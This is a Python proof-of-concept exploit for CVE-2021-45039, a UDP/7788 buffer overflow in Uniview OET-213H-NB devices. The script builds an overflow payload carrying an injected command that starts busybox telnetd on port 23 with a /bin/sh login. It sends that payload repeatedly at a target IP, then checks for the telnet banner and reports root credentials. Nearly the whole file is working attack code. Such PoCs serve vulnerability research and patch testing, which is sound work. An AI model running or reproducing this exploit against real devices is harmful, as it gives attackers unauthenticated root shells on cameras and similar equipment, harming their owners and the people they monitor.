#!/usr/bin/env python3
"""
PoC: CVE-2021-45039 - Uniview UDP/7788 Buffer Overflow
Target: Digital Ally / Uniview OET-213H-NB
Effect: Spawns telnetd on port 23 with root/123456 credentials

Usage: python3 poc_udp_7788_overflow.py -t <target_ip>
"""

import argparse
import socket
import time

DEFAULT_CMD = b";/bin/busybox telnetd -p 23 -l /bin/sh;"
DEFAULT_FUZZ = b"\x55\xaa\x55\xaa" + b"\x00" * 44

def build_payload(cmd: bytes) -> bytes:
    buf = bytearray(DEFAULT_FUZZ)
    buf.extend(b"A" * 2048)
    buf.extend(cmd)
    buf.append(0)
    return bytes(buf)

def spray(target: str, port: int, payload: bytes, count: int, delay: float) -> None:
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(1.0)
    try:
        for i in range(count):
            try:
                sock.sendto(payload, (target, port))
            except OSError as exc:
                print(f"[!] send failed on attempt {i + 1}: {exc}")
            if delay:
                time.sleep(delay)
    finally:
        sock.close()

def check_telnet(host: str, port: int, timeout: float = 5.0) -> bool:
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        sock.settimeout(1.0)
        banner = sock.recv(128)
        print(f"[+] telnet banner: {banner!r}")
        sock.close()
        return True
    except Exception as exc:
        print(f"[-] telnet not reachable yet: {exc}")
        return False

def main() -> None:
    parser = argparse.ArgumentParser(description="PoC for Uniview UDP/7788 overflow (CVE-2021-45039)")
    parser.add_argument("-t", "--target", required=True, help="Target IP")
    parser.add_argument("-p", "--port", type=int, default=7788, help="UDP port (default 7788)")
    parser.add_argument("-c", "--count", type=int, default=25, help="Spray count (default 25)")
    args = parser.parse_args()

    payload = build_payload(DEFAULT_CMD)
    print(f"[+] spraying {args.count} UDP datagrams to {args.target}:{args.port}")
    spray(args.target, args.port, payload, args.count, 0.02)

    print("[+] checking telnet on port 23")
    if check_telnet(args.target, 23):
        print("[+] SUCCESS - login with root/123456")
    else:
        print("[-] telnet not responding")

if __name__ == "__main__":
    main()
